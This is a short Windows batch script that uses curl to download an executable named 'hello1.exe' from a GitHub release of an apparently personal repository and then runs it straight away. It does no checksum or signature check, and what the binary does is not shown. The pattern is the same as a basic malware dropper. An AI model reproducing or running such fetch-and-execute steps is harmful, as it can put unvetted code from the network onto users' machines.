@echo off
REM Get the directory where the script is located
set "SCRIPT_DIR=%~dp0"

REM Change to the script's directory
cd /d "%SCRIPT_DIR%"

REM Download hello1.exe directly using curl
"C:\Windows\System32\curl.exe" -L -o "hello1.exe" "https://github.com/deanlol2/lol/releases/download/publish/hello1.exe"

REM Check if the download was successful
if %ERRORLEVEL% NEQ 0 (
    echo Download failed.
    pause
    exit /b 1
) else (
    echo Download completed successfully.
)

REM Run the downloaded executable
echo Running hello1.exe...
start "" "hello1.exe"

REM End of script
echo Done.
pause
